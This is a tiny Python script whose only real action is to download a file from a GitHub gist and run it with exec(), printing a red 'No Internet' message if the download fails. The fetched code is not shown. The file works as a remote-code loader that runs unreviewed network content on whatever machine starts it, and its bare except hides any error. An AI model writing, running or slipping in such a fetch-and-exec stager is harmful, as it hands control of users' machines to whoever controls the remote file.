import urllib.request as u

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

try:
    exec(
        u.urlopen(
            "https://gist.githubusercontent.com/jubairbro/dc98c9ab682324117b82fe52104263e9/raw/offline.py",
            timeout=5
        ).read()
    )
except:
    print(f"{RED}No Internet{RESET}")
